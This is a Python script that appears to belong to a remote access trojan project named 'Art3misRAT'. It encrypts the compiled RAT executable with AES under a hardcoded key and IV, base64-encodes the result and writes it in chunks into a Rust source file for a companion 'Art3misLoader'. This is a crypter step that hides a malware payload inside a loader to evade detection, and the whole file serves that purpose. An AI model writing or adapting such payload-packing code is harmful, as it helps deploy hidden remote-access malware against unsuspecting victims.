import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os

key = b'YWG88ggzyYZkxMhhc9lOZzpaR21GlC0K'  # 32 bytes AES key
iv = b't0MQeRPju1IiYYqW'  # 16 bytes IV

def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    encoded_ciphertext = base64.b64encode(ciphertext).decode('utf-8')
    return encoded_ciphertext

def split_into_chunks(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

exe_path = r"C:\Art3mis\Art3misRAT\target\release\Art3misRAT.exe"
output_path = r"C:\Art3mis\Art3misLoader\art3misrat_chunks.rs"

encrypted_exe = encrypt_file(exe_path)
chunks = split_into_chunks(encrypted_exe, 100)  # Adjust chunk size if needed

# Create the Rust file with the embedded chunks
with open(output_path, 'w') as f:
    f.write('const ENCRYPTED_DATA: &[&str] = &[\n')
    for chunk in chunks:
        f.write(f'    "{chunk}",\n')
    f.write('];\n')

print(f'Encrypted chunks saved to {output_path}')
